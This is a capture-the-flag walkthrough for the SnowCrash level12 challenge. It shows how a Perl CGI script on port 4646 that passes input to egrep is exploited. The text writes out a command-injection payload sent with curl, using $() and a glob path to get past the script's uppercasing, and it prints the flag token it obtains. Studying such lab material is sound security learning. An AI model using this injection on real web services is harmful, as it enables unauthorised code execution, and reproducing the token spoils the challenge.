In this level we have a perl script

It's running locally on port 4646.

It needs an argument, and we need to exploit this line with egrep :

egrep "^$xx" /tmp/xd 2>$1;

egrep launch a subshell from the parent shell.

//Trying to run the script locally we can understand that it needs to get a capital letter value to x.

$xx =~ tr/a-z/A-Z/;  	// Switch all letters to capital letters
$xx =~ s/\s.*//;	// Substitue all whitespaces (/f/t/n/r/v) and any character except newline with nothing

	-> \s	It matches for [\f\t\n\r] i.e form feed, tab, newline and carriage return.
	-> .	Any character except newline.
	-> *	Matches 0 or more times.

We can try to give a bash script as an argument and then redirect getflag in a tmp file in it.
We need to give just the filename as argument for the egrep to execute correctly
To pass all these modifications, our file name must be in capital letters.

Let's try that

echo "getflag > /tmp/flag" > /tmp/flag.sh

Let's get the right to execute it :

chmod +x /tmp/flag.sh

And rename it, because we need it in capital letters

mv /tmp/flag.sh /tmp/FLAG.SH

And then we can give it as parameter

perl level12 x='/*/flag.sh'

Capital letters or not in the command path isn't important because the script will modify it anyway.

Looks like it's not working. Because we are calling the script locally and we need to call it with
an http call.
Let's to that with curl !
We know that the script is running on localhost on port 4646

To make sure the server is accepting our http request we are going to try with some false example :

level12@SnowCrash:~$ curl '127.0.0.1:4646?x=$(/*/WEIRD.SH)'
..level12@SnowCrash:~cat /var/log/apache2/error.log )'
...
[Tue Mar 08 11:25:25 2022] [error] [client 127.0.0.1] sh: 1: 
[Tue Mar 08 11:25:25 2022] [error] [client 127.0.0.1] /*/WEIRD.SH: not found
[Tue Mar 08 11:25:25 2022] [error] [client 127.0.0.1] 

The behavior is what we wanted, now let's send the real script :

curl '127.0.0.1:4646?x=$(/*/FLAG.SH)'

Our script is supposed to redirect the getflag return in /tmp/flag so let's open it :

cat /tmp/flag

Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
